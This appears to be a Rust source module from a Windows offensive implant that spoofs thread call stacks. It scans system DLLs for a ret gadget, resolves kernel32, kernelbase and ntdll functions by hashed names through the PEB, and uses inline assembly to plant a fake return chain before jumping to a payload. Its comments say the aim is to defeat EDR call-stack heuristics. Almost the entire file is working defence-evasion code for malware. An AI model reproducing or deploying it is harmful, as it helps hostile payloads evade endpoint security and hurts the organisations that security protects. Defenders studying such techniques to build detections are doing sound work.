// spoof.rs — Synthetic call stack frame injection
//
// Technique: Gadget-based return address spoofing
//   1. Find a `ret` gadget inside a legitimate system DLL
//   2. Before calling the payload, push a fake return chain:
//        [ret_gadget] → [WaitForSingleObjectEx frame] → [BaseThreadInitThunk]
//   3. Adjust RSP to point to the fake chain
//   4. JMP to payload entry
//
// Result: thread call stack looks like:
//   ntdll.dll!RtlUserThreadStart
//   kernel32.dll!BaseThreadInitThunk
//   kernelbase.dll!WaitForSingleObjectEx
//   <payload>
//
// This defeats EDR call stack inspection heuristics that flag
//   threads with no legitimate DLL frames above the payload.

#![allow(non_snake_case, dead_code)]

use core::{arch::asm, ffi::c_void, ptr::null_mut};
use crate::defs::*;
use crate::syscall::get_proc_from_peb;
use crate::utils::djb2;

// ─── Find `ret` (0xC3) gadget inside a module's .text ────────────────────────

unsafe fn find_ret_gadget(module_hash: u32) -> Option<*const u8> {
    // We need any exported symbol to locate the module base,
    // then scan forward in .text for 0xC3.
    // Use a known-stable export: kernel32!Sleep for kernel32, ntdll!NtClose for ntdll.
    let (mod_h, exp_h) = (module_hash, djb2(b"Sleep"));
    let export = get_proc_from_peb(mod_h, exp_h)?;
    // Scan backwards for module base (MZ header)
    let mut ptr = export as usize;
    while ptr > 0x10000 {
        if (ptr as *const u16).read_unaligned() == IMAGE_DOS_SIGNATURE {
            let base = ptr as *const u8;
            // Scan .text for 0xC3
            let scan_limit = 0x80000usize; // 512KB
            for offset in 0..scan_limit {
                if *base.add(offset) == 0xC3u8 {
                    return Some(base.add(offset));
                }
            }
        }
        ptr -= 0x1000;
    }
    None
}

// ─── Spoof frame structure ────────────────────────────────────────────────────

#[repr(C)]
struct SpoofFrame {
    ret_gadget:            *const u8,  // lands here after payload's first ret
    wait_for_single_ret:   *const u8,  // WaitForSingleObjectEx return stub
    base_thread_init:      *const u8,  // BaseThreadInitThunk
    rtl_user_thread_start: *const u8,  // RtlUserThreadStart
}

// ─── Build fake call stack and jump to entry ──────────────────────────────────

pub unsafe fn spoof_and_call(entry: *const u8, arg: *mut c_void) {
    let k32_h   = djb2(b"kernel32.dll");
    let kb_h    = djb2(b"kernelbase.dll");
    let ntdll_h = djb2(b"ntdll.dll");

    // Find gadgets
    let ret_gadget = find_ret_gadget(k32_h)
        .or_else(|| find_ret_gadget(ntdll_h))
        .unwrap_or(entry); // fallback: just call directly

    // Find legitimate frame addresses
    let bti_h  = djb2(b"BaseThreadInitThunk");
    let rtl_h  = djb2(b"RtlUserThreadStart");
    let wfso_h = djb2(b"WaitForSingleObjectEx");

    let base_thread_init      = get_proc_from_peb(k32_h, bti_h).unwrap_or(ret_gadget);
    let rtl_user_thread_start = get_proc_from_peb(ntdll_h, rtl_h).unwrap_or(ret_gadget);
    let wait_for_single       = get_proc_from_peb(kb_h, wfso_h).unwrap_or(ret_gadget);

    // Build frame on stack and trampoline to entry
    // Layout (stack grows down):
    //   [rsp+00] = ret_gadget          ← payload returns here → jumps to wait_for_single
    //   [rsp+08] = wait_for_single     ← "caller" of payload
    //   [rsp+16] = base_thread_init
    //   [rsp+24] = rtl_user_thread_start
    asm!(
        "sub rsp, 0x20",                   // shadow space for entry
        // Build fake return chain above current rsp
        "lea rax, [rsp+0x20]",
        "mov [rax+0x00], {ret_g}",
        "mov [rax+0x08], {wfso}",
        "mov [rax+0x10], {bti}",
        "mov [rax+0x18], {rtl}",
        // Set arg in rcx
        "mov rcx, {arg}",
        // Adjust rsp to fake frame and jmp to entry
        "sub rsp, 0x28",
        "mov rax, {entry}",
        "jmp rax",
        ret_g  = in(reg) ret_gadget,
        wfso   = in(reg) wait_for_single,
        bti    = in(reg) base_thread_init,
        rtl    = in(reg) rtl_user_thread_start,
        arg    = in(reg) arg,
        entry  = in(reg) entry,
        options(noreturn)
    );
}
